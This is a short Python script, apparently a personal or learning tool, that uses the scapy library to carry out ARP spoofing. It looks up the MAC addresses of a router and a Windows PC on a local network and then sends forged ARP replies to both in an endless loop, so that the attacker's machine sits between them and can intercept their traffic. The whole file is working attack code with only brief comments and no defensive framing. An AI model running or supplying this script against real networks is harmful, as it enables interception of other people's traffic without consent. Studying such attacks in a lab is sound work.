#!/usr/bin/python

import scapy.all as scapy

def get_mac(ip):
    # request that contain the IP destination of the target
    request = scapy.ARP(pdst=ip)
    # broadcast packet creation
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # concat packets
    final_packet = broadcast / request
    # getting the response
    answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
    # getting the MAC (its src because its a response)
    mac = answer[0][1].hwsrc
    return mac

# we will send the packet to the target by pretending being the spoofed
def spoofing(target, spoofed):
    # getting the MAC of the target
    mac = get_mac(target)
    # generating the spoofed packet modifying the source and the target
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
    # sending the packet
    scapy.send(packet, verbose=False)

def main():
    try:
        while True:
            spoofing("192.168.1.1", "192.168.1.130") # router (source, dest -> attacker machine)
            spoofing("192.168.1.130", "192.168.1.1") # win PC
    except KeyboardInterrupt:
        print("[!] Process stopped")
        exit()

if __name__ == "__main__":
    main()
